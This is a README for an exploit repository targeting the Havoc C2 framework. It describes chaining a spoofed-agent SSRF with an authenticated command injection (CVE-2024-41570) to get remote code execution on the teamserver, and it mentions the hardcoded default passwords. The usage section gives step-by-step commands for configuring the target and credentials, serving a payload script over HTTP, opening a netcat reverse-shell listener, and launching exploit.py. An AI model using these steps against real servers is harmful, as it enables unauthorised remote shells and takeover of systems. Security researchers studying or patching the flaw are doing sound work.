# Havoc-C2-RCE
This is a Chained RCE (CVE-2024-41570) in the Havoc C2 framework.

Command injection: Havoc is vulnerable to command injection enabling an authenticated user to execute commands on the Teamserver. Affects versions 0.3 up to the latest release 0.6. Havoc's default profile contains hardcoded passwords, so a C2 operator careless enough to use the default profile on a public network can immediately be exploited.

SSRF: This vulnerability is exploited by spoofing a demon agent registration and checkins to open a TCP socket on the teamserver and read/write data from it. This allows attackers to leak origin IPs of teamservers and much more.

Chain: Abusing SSRF to deliver an authenticated command injection payload.

# How to use
![2025-01-19 20-01-34](https://github.com/user-attachments/assets/e57accee-6d1e-4633-aa32-a0ee07c42988)

```
1. Modify the IP, USER and PASSWORD in the exploit.py file.
2. Modify IP in payload.sh

-> python3 -m venv myenv && source myenv/bin/activate
-> pip3 install -r requirements.txt
-> chmox +x payload.sh
-> python3 -m http.server (On another terminal)
-> nc -lvnp 4444 (On another terminal)

# Run the exploit
(myenv) -> python3 exploit.py -t https://site.com -i 0.0.0.0 -p 12345
```

Credits to [@chebuya](https://github.com/chebuya/Havoc-C2-SSRF-poc) and [@Hyperreality](https://github.com/IncludeSecurity/c2-vulnerabilities/blob/main/havoc_auth_rce/havoc_rce.py)
